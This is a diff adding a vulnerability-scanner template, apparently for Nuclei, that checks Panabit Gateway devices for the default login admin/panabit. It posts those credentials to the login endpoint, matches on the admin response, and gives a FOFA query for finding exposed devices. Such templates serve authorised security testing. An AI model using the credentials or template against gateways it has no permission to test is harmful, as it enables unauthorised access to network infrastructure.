@@ -1,0 +1,64 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <META HTTP-EQUIV=REFRESH CONTENT="0;URL=/index.htm">
+            - urn:schemas-microsoft-com:vml
+        - part: header
+          type: word
+          words:
+            - paonline_admin
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - panabit
+        username:
+            - admin
+      raw:
+        - |
+          POST /login/userverify.cgi HTTP/1.1
+          Host: {{Hostname}}
+          Origin: {{BaseURL}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAjZMsILtbrBp8VbC
+          Referer: {{BaseURL}}/login/login.htm
+          Accept-Encoding: gzip, deflate
+          Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+          ------WebKitFormBoundaryAjZMsILtbrBp8VbC
+          Content-Disposition: form-data; name="username"
+
+          {{username}}
+          ------WebKitFormBoundaryAjZMsILtbrBp8VbC
+          Content-Disposition: form-data; name="password"
+
+          {{password}}
+          ------WebKitFormBoundaryAjZMsILtbrBp8VbC--
+id: panabit-default-login
+info:
+    author: pikpikcu,ritikchaddha
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+        cvss-score: 9.8
+        cwe-id: CWE-1391
+    description: Panabit Gateway default credentials were discovered.
+    metadata:
+        fofa-query: app="Panabit-智能网关"
+        max-request: 1
+        verified: true
+    name: Panabit Gateway - Default Login
+    reference:
+        - https://max.book118.com/html/2017/0623/117514590.shtm
+        - https://en.panabit.com/wp-content/uploads/Panabit-Intelligent-Application-Gateway-04072020.pdf
+        - https://topic.alibabacloud.com/a/panabit-monitoring-installation-tutorial_8_8_20054193.html
+    severity: critical
+    tags:
+        - panabit
+        - default-login
+        - intrusive
+        - Panabit-智能网关
